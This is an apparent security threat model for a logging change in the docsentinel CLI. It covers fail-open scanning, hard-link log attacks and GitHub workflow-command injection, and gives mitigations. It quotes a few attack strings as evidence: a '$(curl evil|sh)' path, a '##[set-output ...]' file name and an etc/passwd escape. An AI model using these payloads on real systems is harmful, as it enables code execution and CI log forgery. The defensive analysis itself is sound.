# Threat Model - CLI/library logging (docs/specs/logging.md) - 2026-11-14

Scope: the uncommitted logging change. That covers `src/docsentinel/log.py` (`safe()`,
`configure_cli_logging`, the log file, rotation), the `cli.py` wiring (`-v`/`-q`,
`FILE_ONLY`, `_UnexpectedErrorLog`), the new up-front document read in `engine.py`
(`_read_document_bytes` / `_readable_documents`), and the 164 `logger.*` calls added across
`src/docsentinel/**`. Contract: [logging.md](/docs/specs/logging.md). Earlier findings in
[threat-model-0007-template-engine-2026-10-31.md](/docs/security/threat-model-0007-template-engine-2026-10-31.md)
and [threat-model-0007-extensions-2026-11-03.md](/docs/security/threat-model-0007-extensions-2026-11-03.md)
are not repeated here.

Method: read the code, plus an AST audit of every `logger.<level>(...)` call in `src/`
(format string and the provenance of each argument). I also ran these against the working
tree:

- a scan with crafted file names containing `\n`, `\r`, U+0085, `::error`, `%0A` and
  `##[set-output ...]`;
- the same non-UTF-8 input against `HEAD`, in a temporary worktree that has since been removed;
- a `-v` JSON run to stdout with the log directory unwritable;
- a pre-planted hard link in a shared log directory.

## Assets & trust boundaries

- **Untrusted**: the scanned tree. That includes file and directory names, document bytes,
  its `docsentinel.toml` / `pyproject.toml` values, and link targets. It is attacker-controlled
  in `pull_request` CI (`.github/workflows/ci.yml:4,30-42` self-scans PR heads).
- **Trusted invoker**: CLI arguments and the environment (`DOCSENTINEL_LOG_DIR`,
  `DOCSENTINEL_LOG_LEVEL`, `DOCSENTINEL_LOG_KEEP`). `config.py` has no logging option, and
  only `log.py` reads these variables, from `os.environ`. A repository cannot set them
  through config.
- **Sinks**: stderr (in GitHub Actions the runner parses it for workflow commands); the
  per-run log file (`~/.local/logs/docsentinel/`, `0600`, directory `0700` when created);
  stdout (the report channel, which must stay clean); and the exit code (the CI gate).
- **Assets**: integrity of the gate (exit code and findings), integrity of the CI log and its
  annotations, the user's files near the log directory, and the confidentiality of document
  content.

## Findings

### [HIGH] H1 A non-UTF-8 or unreadable document now fails open and leaves the gate green
- Vector / evidence: `engine.py:212-235` (`_readable_documents`) drops every document that
  fails strict UTF-8 decoding or `os.open`. The scan logs a `WARNING` (`engine.py:228-233`),
  removes the document from the inventory (`engine.py:299`), and returns a result with no
  finding for it. Reproduced: `docs/evil.md` holds a root-escaping link (four `..` segments
  up to `etc/passwd`), a dangling link and one `0xFF` byte.
  - `HEAD`: `Scan failed: 'utf-8' codec can't decode byte 0xff ...`, exit **2** (fail-closed;
    `UnicodeDecodeError` is a `ValueError` caught by `cli.py`).
  - Working tree: `WARNING: skipped evil.md: not valid UTF-8`, `0 findings`, exit **0**.
    The report does not list the document at all (`Documents: 1`).
- Impact: a contributor can switch off **every** check for any document by adding one invalid
  byte. That includes DS116 root escapes, DS113 missing assets, DS114 id collisions and DS101
  links. GitHub still renders such a file, because it sniffs or replaces the encoding. The
  only trace is a stderr line, and `DOCSENTINEL_LOG_LEVEL=ERROR` hides it. JSON/report
  consumers and baselines cannot see it. CWE-636 (Not Failing Securely), CWE-693.
- Mitigation: keep the gate fail-closed. Two options:
  - (a) Emit a blocking error finding per skipped document, from a reserved engine rule (for
    example "document is not valid UTF-8 / unreadable", severity error, path and reason only,
    never bytes), and keep the document in the inventory.
  - (b) Restore the old behaviour: raise, so the CLI exits 2.

  Also carry the skipped paths in `ScanResult` so templates and the API can show them. The
  `logging.md` section 3 `WARNING` example for this case must change to match, because
  "coped with" is the wrong class for a gate. Regression test for `testing-expert`: a
  non-UTF-8 document with a DS116 escape must never exit 0.

### [MEDIUM] M1 The log file opens through a pre-planted hard link; the directory's owner and mode are not checked
- Vector / evidence: `log.py:229-236` opens with `O_CREAT|O_APPEND|O_NOFOLLOW` and **without
  `O_EXCL`**. It then accepts any regular file owned by the current user and `fchmod`s it to
  `0600`. The file name is predictable (`<YYYYmmdd-HHMMSS>-<pid>`). `log.py:209-210` accepts
  any existing directory as it is: `is_dir()` follows symlinks, and owner and mode are never
  checked. Reproduced: a hard link named like the next log file, pointing at a file owned by
  the victim, in a world-writable `DOCSENTINEL_LOG_DIR`. The run appended its log lines to
  the victim's file and changed its mode to `0600` (`nlink 2`). Log text keeps shell
  metacharacters: `safe('/repo/$(curl evil|sh)')` passes through unchanged. A
  `~/.bashrc`-style target is therefore code execution on the next shell, with a repo-chosen
  path as the payload.
- Preconditions: another local user can write the log directory. This happens when the
  invoker points `DOCSENTINEL_LOG_DIR` at a shared temporary directory, which the
  `_ensure_directory` docstring explicitly allows. macOS permits hard links to files you do
  not own; Linux blocks them with `fs.protected_hardlinks=1`. The default
  `~/.local/logs/docsentinel` is not exposed. CWE-59, CWE-377/379, CWE-367.
- Mitigation:
  1. Create a new file with `O_EXCL`. Keep the per-process "same second" append by
     remembering the path this process created, or add a counter or random suffix.
  2. Reject `st_nlink != 1` after `fstat`, before any `fchmod` or write.
  3. For an existing directory, `lstat` it. It must be a real directory (not a symlink),
     owned by `geteuid()`, and have no group/other write bit (an `ssh`-style check).
     Otherwise disable the file with the existing single `WARNING`.
  4. Document that `DOCSENTINEL_LOG_DIR` must not point into the checked-out repository or a
     shared directory. A PR-committed symlinked directory would redirect it, because
     `O_NOFOLLOW` only covers the last path component.

### [MEDIUM] M2 Legacy `##[command]` workflow-command injection through stderr log lines
- Vector / evidence: every stderr line starts with `docsentinel: ` (`log.py:102-111`). I
  verified this with names containing `\n`, `\r`, U+0085 and U+2028, which `safe()` escapes,
  so v2 `::cmd::` commands cannot start a line. However, the GitHub runner also accepts the v1
  form `##[name ...]data` **anywhere in a line**: `ActionCommand.TryParse` uses
  `message.IndexOf("##[")`, and the data runs to the end of the line. `neutralize`/`safe()`
  leave `#` and `[` unchanged. Reproduced under `-q`, with a non-UTF-8 file named
  `##[set-output name=x]pwn.md`:
  `docsentinel: WARNING: skipped ##[set-output name=x]pwn.md: not valid UTF-8`.
  The default-visible new sinks are the H1 warning, the DS101 anchor-skip warning (the path of
  the linked file) and the DS117 / docsig config-value warnings. With `-v`, every per-document
  DEBUG line, link targets included, also reaches stderr.
- Impact: a PR can forge `error`/`warning` annotations on arbitrary files, `add-mask` arbitrary
  text, and possibly `set-output`/`save-state`. GitHub postponed removing those (changelog
  2023-07-24); runtime acceptance is not verified here. A forged step output that later flows
  into a `run:` expression turns into command injection. CWE-117, CWE-74, CWE-150. The
  stdout report sinks (`text`, `Scan failed:`) already had the same `##[` exposure; they share
  `neutralize` and should be fixed with it.
- Mitigation: break the sequence in the shared table, for example rewrite `##[` as `#\x23[`
  in `neutralize` (it feeds `safe()`, `neutralize_text` and the `gha_*` filters), so it covers
  logs and reports together. Add a unit test for `safe("##[error]x")` and an integration test
  that greps stderr for `##[`.

### [LOW] L1 Rotation does not check ownership, matches a loose pattern, and races with concurrent runs
- Vector / evidence: `log.py:43` (`docsentinel-*.log`) and `log.py:258-280`. Rotation deletes
  any regular, non-symlink match regardless of `st_uid`. In a shared directory without the
  sticky bit, that includes other users' files and anything named like
  `docsentinel-important.log`. Ordering by mtime lets a planted file with a future mtime evict
  the user's real logs. Two concurrent runs with a small `DOCSENTINEL_LOG_KEEP` can unlink
  each other's live file (diagnostics lost). `unlink` never follows symlinks, so redirecting
  the target is not possible. CWE-367, CWE-73.
- Mitigation: match `^docsentinel-\d{8}-\d{6}-\d+\.log$` exactly, skip `st_uid != geteuid()`,
  and never delete a file whose mtime is within the last few minutes. M1's directory check
  removes the shared-directory case entirely.

### [LOW] L2 Tracebacks write raw exception text to the file, and the unexpected-error path still prints Python's raw traceback to stderr
- Vector / evidence: `cli.py:382,710,794` (`logger.exception`) and `cli.py:562`
  (`exc_info=`). The message argument goes through `safe()`, but `Formatter.formatException`
  writes `str(exc)` verbatim into the file. A multi-line message can forge file log lines
  (local, `0600`; CWE-117). After `_UnexpectedErrorLog` the exception still propagates, so the
  interpreter prints an unneutralised traceback to stderr. That behaviour predates this change.
  In Actions, an exception message containing `\n::cmd::` or `##[` from a repo-derived value
  would be parsed as a workflow command. `OSError` paths are `repr`-quoted and safe; the risk
  is analyzer exceptions that embed scanned text.
- Mitigation: give the file handler a `Formatter` subclass whose `formatException` runs each
  line through `neutralize` and keeps only the frame newlines. Owner decision: in `main`,
  turn the escaping exception into a single neutralised stderr line and exit 2 (currently 1,
  from the traceback).

### [LOW] L3 The up-front read costs a full extra pass, holds bytes and text together, and has no FIFO guard
- Vector / evidence: `engine.py:200-209` reads every discovered document fully, then decodes
  it while still holding the bytes, before any rule runs. This happens even when no active
  rule reads content (for example `select=["DS118"]`, which claims to never read content) and
  before the deep-unconfirmed early return. The peak per file is about the same as the
  detectors' own `read()`. Nothing is newly unbounded, but this doubles I/O and makes a huge
  `.md` cost something on every profile. `os.open(O_RDONLY)` blocks forever on a FIFO.
  `discovery.py:59` (`is_file()`) excludes FIFOs, so only a local race between discovery and
  read reaches it. `O_NOFOLLOW` here does not protect the detectors, which reopen through a
  symlink-following `path.open`. CWE-400, CWE-367.
- Mitigation: validate as a stream (`codecs.getincrementaldecoder("utf-8")` over 1 MiB chunks,
  without keeping the data). Open with `O_NONBLOCK`, then `fstat` and require `S_ISREG`.
  Skip the pass when no active rule reads content, or better, read once and share the text
  with analyzers.

### [LOW] L4 Unbounded per-document WARNING lines on stderr
- Vector / evidence: `engine.py:229,232` writes one `WARNING` per skipped document, visible
  even under `-q`. A PR with tens of thousands of non-UTF-8 `.md` files floods the CI log. That
  goes against the CLAUDE.md rule to never print unbounded output to CI, and M2 multiplies
  the injection surface. CWE-779.
- Mitigation: show at most N (for example 20) per-document warnings on stderr, then one
  summary line. Send the rest with `extra=FILE_ONLY`.

### [INFO] I1 `safe()` coverage
- AST audit of 164 `logger.*` calls. Every format string is a constant. Each argument is
  either wrapped in `safe()` or `neutralize()` (`telemetry/engine.py:1186`), or is an
  int/float/bool, a module constant, a registry rule code or option name, or a validated enum
  (`settings.profile`, `args.command` from `choices`). `config.py:728` logs option names only
  after `config.py:687-689` rejected unknown keys. `reporting.py:178` (`chosen.origin`) and
  `telemetry/loader.py:1787` (`template.type`) are internal enums. Optionally wrap them in
  `safe()` for defence in depth. `log.py:342` logs pre-`safe()`d problems with `"%s"`.
  `safe()` caps at 200 characters before escaping, so cost is bounded.

### [INFO] I2 Content leakage: none found
- DS114 logs the reader status only (`document_ids.py:670`), never the id. DS115 logs counts
  and the mapping path (`deprecated_refs.py:693,920`), never `old`/`new` tokens. Extension
  failures log names only (`telemetry/extensions.py:2007`). No paragraph, frontmatter or
  comment text is logged. Link targets (`links.py:246,275`) and DS103 code-span path tokens
  (`paths.py:201-205`) are logged at DEBUG. They are the same data as the finding `value`, but
  the log file keeps them after the report is deleted (retention note only).

### [INFO] I3 Stdout integrity and failure tolerance
- Verified: `-v` plus `DOCSENTINEL_LOG_LEVEL=DEBUG` plus an unwritable log directory gives
  clean, parseable JSON on stdout and one `WARNING: log file disabled ...` on stderr. Every
  stderr line had the `docsentinel: ` prefix (0 lines without it, across crafted-name runs).
  The handler is bound to `sys.stderr` (`log.py:320`). `configure_cli_logging` catches
  `OSError`/`RuntimeError` (`log.py:335`), so logging setup cannot change the exit code.

### [INFO] I4 Environment parsing and CI exposure
- `DOCSENTINEL_LOG_LEVEL` and `DOCSENTINEL_LOG_KEEP` are robust: invalid values fall back
  with a `safe(...,40)` warning, and keep is clamped to at least 1. No upper bound is needed,
  because keep only retains files. INFO lines echo the absolute scan root, the output path and
  the runner's log path. They contain no secrets, no environment dumps and no config values.
  The CI log file sits in the runner home and is not uploaded (the artifact is
  `reports/` only).

## Verdict: PASS_WITH_FOLLOWUP (merge-conditional)

No CRITICAL finding, so the verdict is not BLOCK. **H1 must be fixed, or explicitly accepted
by the owner, before this change merges to `master`.** As written, it turns a fail-closed
gate (exit 2) into a fail-open one (exit 0) that attacker-controlled input can trigger. M1 and
M2 should land in the same change; they are small and contained in `log.py` /
`telemetry/filters.py`. L1-L4 are follow-ups. Fixes go to `python-expert`; regression tests
(H1 exit code, `##[` in `safe`, `O_EXCL`/`st_nlink`, rotation ownership) go to
`testing-expert`.
